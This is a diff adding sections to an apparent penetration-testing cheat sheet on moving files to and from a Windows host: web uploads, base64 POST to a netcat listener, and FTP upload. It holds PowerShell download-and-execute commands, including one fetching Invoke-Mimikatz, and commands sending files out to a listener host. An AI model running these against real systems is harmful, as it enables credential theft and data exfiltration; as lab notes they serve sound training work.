@@ -107,6 +107,60 @@ PS C:\users\public\downloads> IEX (New-Object Net.WebClient).DownloadString('htt
 PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
 ```
 
+### Web Uploads
+
+Create a uploads webserver:
+
+```bash
+gareth@gareth:~/test$ pip3 install uploadserver
+gareth@gareth:~/test$ python3 -m uploadserver
+File upload available at /upload
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+Upload file from Windows:
+
+```bash
+PS C:\Users\Public\Downloads> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+PS C:\Users\Public\Downloads> Invoke-FileUpload -Uri http://192.168.0.51:8000/upload -File C:\users\public\downloads\hello.py
+
+[+] File Uploaded:  C:\users\public\downloads\hello.py
+[+] FileHash:  01C0A257EDD3C2E95C25D80A4C18C5CC
+```
+
+### Web Uploads Using Base64
+
+```powershell-session
+PS C:\Users\Public\Downloads> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\users\public\downloads\hello.py' -Encoding Byte))
+```
+
+Create a NC listener:
+
+```bash
+gareth@gareth:~/test$ sudo nc -lvp 8000
+```
+
+Send Base64 encoded file:
+
+```
+PS C:\Users\Public\Downloads> Invoke-WebRequest -Uri http://192.168.0.51/ -Method POST -Body $b64
+```
+
+Results:
+
+```bash
+gareth@gareth:~/test$ sudo nc -lvp 80
+Listening on 0.0.0.0 80
+Connection received on 192.168.0.75 1979
+POST / HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-GB) WindowsPowerShell/5.1.19041.4894
+Content-Type: application/x-www-form-urlencoded
+Host: 192.168.0.51
+Content-Length: 28
+Connection: Keep-Alive
+
+cHJpbnQoImhlbGxvIHdvcmxkISIp
+```
 ## SMB
 
 Create SMB server:
@@ -157,3 +211,23 @@ Copy file:
 PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadFile('ftp://192.168.0.51/hello.py', 'C:\Users\Public\downloads\hello.py')
 ```
 
+### FTP - Upload
+
+Create writable FTP server
+
+```bash
+gareth@gareth:~/test$ sudo python3 -m pyftpdlib --port 21 --write
+[sudo] password for gareth:            
+/usr/local/lib/python3.10/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
+  warnings.warn("write permissions assigned to anonymous user.",
+[I 2024-09-29 15:06:15] concurrency model: async
+[I 2024-09-29 15:06:15] masquerade (NAT) address: None
+[I 2024-09-29 15:06:15] passive ports: None
+[I 2024-09-29 15:06:15] >>> starting FTP server on 0.0.0.0:21, pid=52705 <<<
+```
+
+Upload file from Windows:
+
+```bash
+PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.0.51/hello.py', 'c:\users\public\downloads\hello.py')
+```
